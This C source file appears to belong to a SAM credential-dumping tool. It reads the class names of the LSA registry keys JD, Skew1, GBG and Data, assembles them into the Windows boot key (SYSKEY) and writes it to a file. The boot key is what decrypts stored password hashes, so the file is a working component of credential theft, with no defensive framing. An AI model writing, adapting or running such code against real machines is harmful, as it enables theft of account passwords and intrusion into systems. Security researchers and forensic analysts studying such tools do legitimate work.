#include "samdump.h"

void dumpSyskey()
{
	WCHAR temp[MAX_PATH * 4]=L"";
	int len = 0;
	FILE* f;

	dumpClassVal(temp, L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD");
	dumpClassVal(temp, L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1");
	dumpClassVal(temp, L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\GBG");
	dumpClassVal(temp, L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\Data");

	f = fopen("SYSKEY", "w");
	fwrite(temp, 1, wcslen(temp)*sizeof(WCHAR), f);
	fclose(f);
}

void dumpClassVal(PWSTR val, PWSTR key)
{	
	HKEY hTestKey;

	if( RegOpenKeyExW( HKEY_LOCAL_MACHINE,key,0,KEY_READ,&hTestKey) != ERROR_SUCCESS)
	{
		printf("Error, could not query the %s key.\n", key);
		return;
	}
	 
    WCHAR    achClass[MAX_PATH] = L"";  // buffer for class name 
    DWORD    cchClassName = MAX_PATH;  // size of class string 
    DWORD    cSubKeys=0;               // number of subkeys 
    DWORD    cbMaxSubKey;              // longest subkey size 
    DWORD    cchMaxClass;              // longest class string 
    DWORD    cValues;              // number of values for key 
    DWORD    cchMaxValue;          // longest value name 
    DWORD    cbMaxValueData;       // longest value data 
    DWORD    cbSecurityDescriptor; // size of security descriptor 
    FILETIME ftLastWriteTime;      // last write time 
 
    DWORD retCode; 
 
    DWORD cchValue = MAX_VALUE_NAME; 
 
    // Get the class name and the value count. 
    retCode = RegQueryInfoKeyW(
        hTestKey,                    // key handle 
        achClass,                // buffer for class name 
        &cchClassName,           // size of class string 
        NULL,                    // reserved 
        &cSubKeys,               // number of subkeys 
        &cbMaxSubKey,            // longest subkey size 
        &cchMaxClass,            // longest class string 
        &cValues,                // number of values for this key 
        &cchMaxValue,            // longest value name 
        &cbMaxValueData,         // longest value data 
        &cbSecurityDescriptor,   // security descriptor 
        &ftLastWriteTime);       // last write time 
	
	
	RegCloseKey(hTestKey);
	//no security pb : 
	//	len(val) = MAX_PATH * 4
	//	len(achClass) = MAX_PATH
	wcsncat(val, achClass, cchClassName);

	return;

}